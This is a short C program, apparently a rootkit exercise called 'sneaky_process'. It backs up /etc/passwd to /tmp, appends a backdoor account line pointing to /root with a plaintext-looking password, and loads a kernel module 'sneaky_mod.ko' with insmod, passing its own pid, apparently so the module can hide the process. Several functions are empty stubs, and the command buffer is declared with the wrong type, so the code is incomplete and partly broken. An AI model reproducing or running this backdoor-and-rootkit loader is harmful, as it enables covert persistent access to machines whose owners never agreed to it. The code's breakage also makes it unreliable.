#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>

void create_new_file(char * in_file, char * out_file) {
  FILE * fin = fopen(in_file, "r");
  FILE * fout = fopen(out_file, "w");
  if (fin == NULL) {
    printf("Can not open input file.\n");
    exit(EXIT_FAILURE);
  }
  if (fout == NULL) {
    printf("Can not open output file.\n");
    exit(EXIT_FAILURE);
  }
  int c;
  while ((c = fgetc(fin)) != EOF) {
    fputc(c, fout);
  }
  fclose(fin);
  fclose(fout);
}

void append_to_file(char * file, char * content) {
  FILE * f = fopen(file, "a");
  if (f == NULL) {
    printf("Can not open file.\n");
    exit(EXIT_FAILURE);
  }
  fputs(content, f);
  fclose(f);
}

void load_sneaky_module(char * module) {
  char * command[60]; 
  snprintf(command, 60, "insmod sneaky_mod.ko pid=%d", (int)getpid());
  system(command);
}

void read_from_keyboard() {

}

void unload_sneaky_module() {
}

void restore_file(char * in_file, char * out_file) {
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  create_new_file("/etc/passwd", "/tmp/passwd");
  append_to_file("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  load_sneaky_module("sneaky_mod.ko");
}
